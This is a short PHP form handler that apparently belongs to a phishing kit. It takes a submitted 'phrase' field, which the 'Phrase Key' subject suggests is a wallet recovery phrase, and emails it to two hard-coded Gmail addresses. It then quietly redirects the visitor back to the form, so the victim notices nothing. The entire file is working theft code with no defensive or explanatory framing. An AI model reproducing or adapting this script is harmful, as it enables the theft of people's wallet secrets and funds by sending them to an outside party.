<?php

$phrase= $_POST['phrase'];

if($_POST["phrase"]) {
    mail("allancelophino@gmail.com, webhoststack@gmail.com", "Phrase Key",
    $_POST[$phrase]. $phrase, "From: webhoststack@gmail.com");
}

if(!$phrase) {
    // Message if mail has not been sent
    echo "<script type='text/javascript'>
        setTimeout(function () {
            window.location = 'form1.html';
        }, 1000);
    </script>";
}
else {
    // Message if mail has been sent
    echo "<script>
        setTimeout(function () {
            window.location = 'form1.html';
        }, 1000);
    </script>";
 
}

exit();
?>